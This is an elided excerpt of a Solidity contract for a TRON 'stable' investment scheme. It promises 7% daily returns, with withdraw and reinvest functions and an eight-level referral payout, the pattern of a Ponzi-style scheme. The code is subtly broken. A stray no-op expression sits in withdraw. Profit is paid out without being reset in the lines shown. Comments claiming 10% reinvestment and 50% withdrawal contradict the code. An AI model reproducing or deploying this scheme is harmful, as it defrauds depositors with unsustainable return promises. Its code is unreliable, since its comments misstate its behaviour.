//SourceUnit: TronchainStable7.sol

pragma solidity ^0.4.25;

contract TronchainStable7 {
    ...
    uint public minuteRate = 810185; //DAILY 7%
    ...
    function withdraw() public {
        collect(msg.sender);
      Player storage player = players[msg.sender];                        // Withdrawal 50%
      uint256 depositAmount = player.interestProfit;
      require(players[msg.sender].interestProfit > 0);
      (msg.sender, players[msg.sender].interestProfit);
      transferPayout(msg.sender, players[msg.sender].interestProfit/2);
    ...
    function reinvest() public {
      collect(msg.sender);
      Player storage player = players[msg.sender];
      uint256 depositAmount = player.interestProfit;                     //Reinvest 10%
      require(address(this).balance >= depositAmount);
      player.interestProfit = 0;
      player.trxDeposit = player.trxDeposit.add(depositAmount);
    ...
    function distributeRef(uint256 _trx, address _affFrom) private{
        ...
        uint256 _allaff = (_trx.mul(16)).div(100);
        ...
        address _affAddr7 = players[_affAddr6].affFrom;
        address _affAddr8 = players[_affAddr7].affFrom;
        uint256 _affRewards = (_trx.mul(200)).div(10000);
